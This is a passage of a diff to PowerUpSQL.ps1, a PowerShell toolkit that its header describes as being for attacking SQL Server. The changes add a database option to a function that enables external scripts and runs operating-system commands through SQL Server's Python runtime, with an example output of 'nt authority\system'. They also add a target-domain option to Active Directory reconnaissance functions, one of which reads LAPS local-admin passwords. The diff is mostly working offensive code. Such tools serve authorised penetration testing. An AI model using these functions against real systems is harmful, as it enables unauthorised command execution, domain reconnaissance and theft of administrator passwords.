@@ -1,9 +1,9 @@
 #requires -version 2
 <#
         File: PowerUpSQL.ps1
-        Author: Scott Sutherland (@_nullbind), NetSPI - 2019
+        Author: Scott Sutherland (@_nullbind), NetSPI - 2020
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.104.13
+        Version: 1.107
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -2003,6 +2003,8 @@ Function  Invoke-SQLOSCmdPython
             SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
             SQL Server credential.
+			.PARAMETER Database
+            Database that you have rights to execute commands.
             .PARAMETER Instance
             SQL Server instance to connection to.
             .PARAMETER DAC
@@ -2053,6 +2055,23 @@ Function  Invoke-SQLOSCmdPython
             nt authority\system
 
             VERBOSE: Closing the runspace pool
+			
+			.EXAMPLE
+            PS C:\> Invoke-SQLOSCmdPython -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Database trusted_db -Command "whoami" -RawResults
+            VERBOSE: Creating runspace pool and session states
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Connection Success.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : You are a sysadmin.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Show Advanced Options is disabled.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Enabled Show Advanced Options.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : External scripts are disabled.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Enabled external scripts.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Executing command: whoami
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Disabling external scripts
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Disabling Show Advanced Options
+
+            nt authority\system
+
+            VERBOSE: Closing the runspace pool
     #>
     [CmdletBinding()]
     Param(
@@ -2063,6 +2082,10 @@ Function  Invoke-SQLOSCmdPython
         [Parameter(Mandatory = $false,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
+		
+		[Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server database to connection to.')]
+        [string]$Database,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Windows credentials.')]
@@ -2158,6 +2181,12 @@ Function  Invoke-SQLOSCmdPython
                 # Create connection object
                 $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
             }
+			# Setup database string
+            if($Database)
+            {
+                # Create connection object
+                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Database $Database -Credential $Credential -TimeOut $TimeOut
+            }
             else
             {
                 # Create connection object
@@ -2190,6 +2219,12 @@ Function  Invoke-SQLOSCmdPython
                     Write-Verbose -Message "$Instance : You are a sysadmin."
                     $IsExternalScriptsEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'external scripts enabled'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                     $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+                }
+				if($Database)
+                {
+                    Write-Verbose -Message "$Instance : Executing on $Database"
+                    $IsExternalScriptsEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'external scripts enabled'" -Username $Username -Password $Password -Database $Database -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Database $Database -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                 }
                 else
                 {
@@ -2262,8 +2297,13 @@ Function  Invoke-SQLOSCmdPython
                 }
 
                 # Check if the configuration has been change in the run state 
-                $EnabledInRunValue = Get-SQLQuery -Instance $Instance -Query "SELECT value_in_use FROM master.sys.configurations WHERE name LIKE 'external scripts enabled'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -ExpandProperty value_in_use            
-                if($EnabledInRunValue -eq 0){
+                if($IsSysadmin -eq 'Yes'){
+					$EnabledInRunValue = Get-SQLQuery -Instance $Instance -Query "SELECT value_in_use FROM master.sys.configurations WHERE name LIKE 'external scripts enabled'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -ExpandProperty value_in_use            
+                }
+				if($Database){
+					$EnabledInRunValue = Get-SQLQuery -Instance $Instance -Query "SELECT value_in_use FROM master.sys.configurations WHERE name LIKE 'external scripts enabled'" -Username $Username -Password $Password -Database $Database -Credential $Credential -SuppressVerbose | Select-Object -ExpandProperty value_in_use
+				}
+				if($EnabledInRunValue -eq 0){
                     Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is not enabled in runtime."
                     Write-Verbose -Message "$Instance : - The SQL Server service will need to be manually restarted for the change to take effect."
                     Write-Verbose -Message "$Instance : - Not recommended unless you're the DBA."
@@ -2287,8 +2327,12 @@ WITH RESULT SETS (([Output] nvarchar(max)))
 "@
 
                 # Execute query    
-                $CmdResults = Get-SQLQuery -Instance $Instance -Query $QueryCmdExecute -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select Output -ExpandProperty Output
-
+                if($IsSysadmin -eq 'Yes'){
+					$CmdResults = Get-SQLQuery -Instance $Instance -Query $QueryCmdExecute -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select Output -ExpandProperty Output
+				}
+				if($Database){
+					$CmdResults = Get-SQLQuery -Instance $Instance -Query $QueryCmdExecute -Username $Username -Password $Password -Database $Database -Credential $Credential -SuppressVerbose | select Output -ExpandProperty Output
+				}
                 # Display results or add to final results table
                 if($RawResults)
                 {
@@ -2341,6 +2385,7 @@ WITH RESULT SETS (([Output] nvarchar(max)))
         return $TblResults
     }
 }
+
 
 # ----------------------------------
 #  Invoke-SQLOSCmdOle
@@ -7472,6 +7517,8 @@ Function  Get-SQLDomainUser
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .PARAMETER FilterUser
             Domain user to filter for.
             .PARAMETER UserState
@@ -7540,6 +7587,11 @@ Function  Get-SQLDomainUser
 
         [Parameter(Mandatory = $false,
         ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Domain user to filter for.')]
         [string]$FilterUser,
 
@@ -7599,9 +7651,9 @@ Function  Get-SQLDomainUser
     {
         # Call Get-SQLDomainObject    
         if($UseAdHoc){
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields "samaccountname,name,admincount,whencreated,whenchanged,adspath" -UseAdHoc            
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields "samaccountname,name,admincount,whencreated,whenchanged,adspath" -UseAdHoc            
         }else{
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields "samaccountname,name,admincount,whencreated,whenchanged,adspath"          
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields "samaccountname,name,admincount,whencreated,whenchanged,adspath"          
         }
     }
 
@@ -7637,6 +7689,8 @@ Function  Get-SQLDomainSubnet
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .EXAMPLE
             PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
             .EXAMPLE
@@ -7681,6 +7735,11 @@ Function  Get-SQLDomainSubnet
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -7697,7 +7756,12 @@ Function  Get-SQLDomainSubnet
     Process
     {
         # Get the domain of the server
-        $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | Select-Object DomainName -ExpandProperty DomainName
+        if($TargetDomain)
+        {
+            $Domain = $TargetDomain
+        }else{
+            $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | Select-Object DomainName -ExpandProperty DomainName
+        }
         $DomainDistinguishedName = Get-SQLDomainObject -SuppressVerbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath "$Domain" -LdapFilter "(name=$Domain)" -LdapFields 'distinguishedname' -UseAdHoc | Select-Object distinguishedname -ExpandProperty distinguishedname
         
         # Call Get-SQLDomainObject    
@@ -7740,6 +7804,8 @@ Function  Get-SQLDomainSite
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .EXAMPLE
             PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
             .EXAMPLE
@@ -7784,6 +7850,11 @@ Function  Get-SQLDomainSite
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -7800,7 +7871,12 @@ Function  Get-SQLDomainSite
     Process
     {
         # Get the domain of the server
-        $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | Select-Object DomainName -ExpandProperty DomainName
+        if($TargetDomain)
+        {
+            $Domain = $TargetDomain
+        }else{
+            $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | Select-Object DomainName -ExpandProperty DomainName
+        }
         $DomainDistinguishedName = Get-SQLDomainObject -SuppressVerbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath "$Domain" -LdapFilter "(name=$Domain)" -LdapFields 'distinguishedname' -UseAdHoc | Select-Object distinguishedname -ExpandProperty distinguishedname
         
         # Call Get-SQLDomainObject    
@@ -7843,6 +7919,8 @@ Function  Get-SQLDomainComputer
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .PARAMETER FilterComputer
             Domain computer to filter for.
             .EXAMPLE
@@ -7894,6 +7972,11 @@ Function  Get-SQLDomainComputer
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -7916,9 +7999,9 @@ Function  Get-SQLDomainComputer
     {
         # Call Get-SQLDomainObject    
         if($UseAdHoc){
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields 'samaccountname,dnshostname,operatingsystem,operatingsystemversion,operatingSystemServicePack,whencreated,whenchanged,adspath' -UseAdHoc            
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields 'samaccountname,dnshostname,operatingsystem,operatingsystemversion,operatingSystemServicePack,whencreated,whenchanged,adspath' -UseAdHoc            
         }else{
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields 'samaccountname,dnshostname,operatingsystem,operatingsystemversion,operatingSystemServicePack,whencreated,whenchanged,adspath'            
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields 'samaccountname,dnshostname,operatingsystem,operatingsystemversion,operatingSystemServicePack,whencreated,whenchanged,adspath'            
         }
     }
 
@@ -7953,6 +8036,8 @@ Function  Get-SQLDomainOu
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .EXAMPLE
             PS C:\> Get-SQLDomainOu -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
             .EXAMPLE
@@ -7997,6 +8082,11 @@ Function  Get-SQLDomainOu
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -8014,9 +8104,9 @@ Function  Get-SQLDomainOu
     {
         # Call Get-SQLDomainObject    
         if($UseAdHoc){
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter '(objectCategory=organizationalUnit)' -LdapFields 'name,distinguishedname,adspath,instancetype,whencreated,whenchanged' -UseAdHoc            
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter '(objectCategory=organizationalUnit)' -LdapFields 'name,distinguishedname,adspath,instancetype,whencreated,whenchanged' -UseAdHoc            
         }else{
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter '(objectCategory=organizationalUnit)' -LdapFields 'name,distinguishedname,adspath,instancetype,whencreated,whenchanged'
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter '(objectCategory=organizationalUnit)' -LdapFields 'name,distinguishedname,adspath,instancetype,whencreated,whenchanged'
         }
     }
 
@@ -8053,6 +8143,8 @@ Function  Get-SQLDomainAccountPolicy
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .EXAMPLE
             PS C:\> Get-SQLDomainAccountPolicy -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
             .EXAMPLE
@@ -8097,6 +8189,12 @@ Function  Get-SQLDomainAccountPolicy
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -8126,9 +8224,9 @@ Function  Get-SQLDomainAccountPolicy
     {
         # Call Get-SQLDomainObject    
         if($UseAdHoc){
-            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter '(objectClass=domainDNS)' -LdapFields 'pwdhistorylength,lockoutthreshold,lockoutduration,lockoutobservationwindow,minpwdlength,minpwdage,pwdproperties,whenchanged,gplink' -UseAdHoc            
+            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter '(objectClass=domainDNS)' -LdapFields 'pwdhistorylength,lockoutthreshold,lockoutduration,lockoutobservationwindow,minpwdlength,minpwdage,pwdproperties,whenchanged,gplink' -UseAdHoc            
         }else{
-            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter '(objectClass=domainDNS)' -LdapFields 'pwdhistorylength,lockoutthreshold,lockoutduration,lockoutobservationwindow,minpwdlength,minpwdage,pwdproperties,whenchanged,gplink'
+            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter '(objectClass=domainDNS)' -LdapFields 'pwdhistorylength,lockoutthreshold,lockoutduration,lockoutobservationwindow,minpwdlength,minpwdage,pwdproperties,whenchanged,gplink'
         }
 
         $Results | ForEach-Object {
@@ -8183,6 +8281,8 @@ Function  Get-SQLDomainGroup
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .PARAMETER FilterGroup
             Domain group to filter for.
             .EXAMPLE
@@ -8234,6 +8334,11 @@ Function  Get-SQLDomainGroup
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -8256,9 +8361,9 @@ Function  Get-SQLDomainGroup
     {
         # Call Get-SQLDomainObject    
         if($UseAdHoc){
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields 'samaccountname,adminCount,whencreated,whenchanged,adspath' -UseAdHoc            
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields 'samaccountname,adminCount,whencreated,whenchanged,adspath' -UseAdHoc            
         }else{
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields 'samaccountname,adminCount,whencreated,whenchanged,adspath'            
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields 'samaccountname,adminCount,whencreated,whenchanged,adspath'            
         }
     }
 
@@ -8293,6 +8398,8 @@ Function  Get-SQLDomainTrust
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .EXAMPLE
             PS C:\> Get-SQLDomainTrust -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
             .EXAMPLE
@@ -8337,6 +8444,11 @@ Function  Get-SQLDomainTrust
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -8364,9 +8476,9 @@ Function  Get-SQLDomainTrust
     {
         # Call Get-SQLDomainObject    
         if($UseAdHoc){
-            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectClass=trustedDomain)" -LdapFields 'trustpartner,distinguishedname,trusttype,trustdirection,trustattributes,whencreated,whenchanged,adspath' -UseAdHoc            
+            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectClass=trustedDomain)" -LdapFields 'trustpartner,distinguishedname,trusttype,trustdirection,trustattributes,whencreated,whenchanged,adspath' -UseAdHoc            
         }else{
-            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectClass=trustedDomain)" -LdapFields 'trustpartner,distinguishedname,trusttype,trustdirection,trustattributes,whencreated,whenchanged,adspath'            
+            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectClass=trustedDomain)" -LdapFields 'trustpartner,distinguishedname,trusttype,trustdirection,trustattributes,whencreated,whenchanged,adspath'            
         }
 
         $Result | ForEach-Object {
@@ -8452,6 +8564,8 @@ Function  Get-SQLDomainPasswordsLAPS
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .EXAMPLE
             PS C:\> Get-SQLDomainPasswordsLAPS -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
             .EXAMPLE
@@ -8496,6 +8610,11 @@ Function  Get-SQLDomainPasswordsLAPS
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -8518,9 +8637,9 @@ Function  Get-SQLDomainPasswordsLAPS
     {
         # Call Get-SQLDomainObject    
         if($UseAdHoc){
-            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,ms-MCS-AdmPwd,adspath' -UseAdHoc            
+            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,ms-MCS-AdmPwd,adspath' -UseAdHoc            
         }else{
-            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,ms-MCS-AdmPwd,adspath'            
+            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,ms-MCS-AdmPwd,adspath'            
         }
         
         $Result | ForEach-Object {
@@ -8570,6 +8689,8 @@ Function  Get-SQLDomainController
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .EXAMPLE
             PS C:\> Get-SQLDomainController -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
             .EXAMPLE
@@ -8614,6 +8735,11 @@ Function  Get-SQLDomainController
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -8631,9 +8757,9 @@ Function  Get-SQLDomainController
     {
         # Call Get-SQLDomainObject    
         if($UseAdHoc){
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -LdapFields 'name,dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount' -UseAdHoc            
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -LdapFields 'name,dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount' -UseAdHoc            
         }else{
-            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -LdapFields 'name,dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount'            
+            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -LdapFields 'name,dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount'            
         }
 
     }
@@ -8669,6 +8795,8 @@ Function  Get-SQLDomainExploitableSystem
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .EXAMPLE
             PS C:\> Get-SQLDomainExploitableSystem -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
             .EXAMPLE
@@ -8711,6 +8839,11 @@ Function  Get-SQLDomainExploitableSystem
         [Parameter(Mandatory = $false,
         HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
         [Switch]$UseAdHoc,
+
+        [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
@@ -8822,9 +8955,9 @@ Function  Get-SQLDomainExploitableSystem
     {
         # Call Get-SQLDomainObject    
         if($UseAdHoc){
-            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount' -UseAdHoc            
+            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount' -UseAdHoc            
         }else{
-            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount'            
+            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount'            
         }
 
         # Iterate through each exploit
@@ -8889,6 +9022,8 @@ Function  Get-SQLDomainGroupMember
             SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
+            .PARAMETER TargetDomain
+            Domain to query.
             .PARAMETER FilterGroup
             Domain group to filter for.
             .EXAMPLE
@@ -8940,6 +9075,11 @@ Function  Get-SQLDomainGroupMember
         [Switch]$UseAdHoc,
 
         [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Domain to query.')]
+        [string]$TargetDomain,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose
     )
@@ -8967,18 +9107,18 @@ Function  Get-SQLDomainGroupMember
     {
         # Call Get-SQLDomainObject to get group DN
         if($UseAdHoc){
-            $FullDN = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields 'distinguishedname' -UseAdHoc -SuppressVerbose
